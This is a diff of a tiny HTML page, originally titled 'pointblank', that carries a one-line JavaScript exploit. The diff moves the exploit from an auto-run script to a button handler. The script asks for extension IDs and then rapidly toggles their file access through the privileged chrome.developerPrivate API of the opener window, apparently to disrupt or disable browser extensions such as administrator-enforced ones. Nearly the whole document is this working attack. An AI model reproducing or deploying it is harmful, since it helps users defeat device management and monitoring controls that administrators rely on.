@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>pointblank</title>
+    <title>CODE</title>
+    <script>
+      function myFunction() {
+        javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
+      }
+    </script>
   </head>
   <body>
-    <h1>Welcome to Pointblank!</h1>
-    <p>Pointblank javascript code has run.</p>
-    <script>
-    javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
-    </script>
+    <button onclick="myFunction()">Click me</button>
+    <!-- The rest of your website content goes here -->
   </body>
 </html>
